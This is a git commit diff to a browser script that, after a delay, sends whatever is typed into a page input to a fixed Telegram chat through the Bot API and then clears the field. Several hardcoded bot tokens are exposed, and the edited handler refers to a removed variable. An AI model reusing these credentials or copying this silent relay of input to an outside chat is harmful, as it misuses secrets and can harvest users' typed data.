af0de4392c0645354b236b19024d490b2491094c
GurnikVitaliy <111244081+GurnikVitaliy@users.noreply.github.com>
2023-07-17 22:55:10 +0300

    Update main.js

--- main.js
+++ main.js
@@ -4,39 +4,39 @@
 // 'https://api.telegram.org/bot6056299567:AAGocFD7VobQgbcKOx9a3GJ6wBigB3WjEWc/getUpdates'
 
 // ALINA
+
 const btn1 = document.querySelector('#btn1');
-const token1 = '6050757748:AAE0SlqzlC9im6u5LJpO0k30O4xxT8WLeT8';
+const token1 = '5667940201:AAGW91sDZz9QZfN2g4xSAiSVIDBqZFoVVZo';
 
 btn1.addEventListener('click', () => {
-     setTimeout(() => {
-    const input = document.querySelector('#input1');
+   setTimeout(() => {
+    const input1 = document.querySelector('#input1');
+    let inp1 = input1.value;
 
-    let inp1 = input.value;
+    input1.value = '';
+
     const url = 'https://api.telegram.org/bot'+token1+'/sendMessage?chat_id=1201316750&text=';
     let xttp = new XMLHttpRequest();
 
     xttp.open("GET", url+inp1);
     xttp.send();
-    input1.value='';
-     },3000)
+   },10000)
 })
+const print = document.querySelector('.print');
 
 
-// Кристина
-setInterval(() =>{
-  const btn2 = document.querySelector('#btn2');
-  const token2 = '6036356654:AAHW93KddrrOgNunuxzzOIDInznOWUxHhi0';
-  
-  btn2.addEventListener('click', () => {
-      const input2 = document.querySelector('#input2');
-  
-      let inp2 = input2.value;
-      const url = 'https://api.telegram.org/bot'+token2+'/sendMessage?chat_id=1201316750&text=';
-      let xttp = new XMLHttpRequest();
-  
-      xttp.open("GET", url+inp2);
-      xttp.send();
-      
-  })
-  
-},10000)
+btn2.addEventListener('click', () => {
+    setTimeout(() => {
+     const input1 = document.querySelector('#input1');
+     let inp1 = input1.value;
+ 
+     input1.value = '';
+ 
+      const url = 'https://api.telegram.org/bot'+token1+'/sendMessage?chat_id=1201316750&text=';
+     let xttp = new XMLHttpRequest();
+ 
+     xttp.open("GET", url+inp1);
+     xttp.send();
+    },15000)
+ })
+ const printt = document.querySelector('.print');
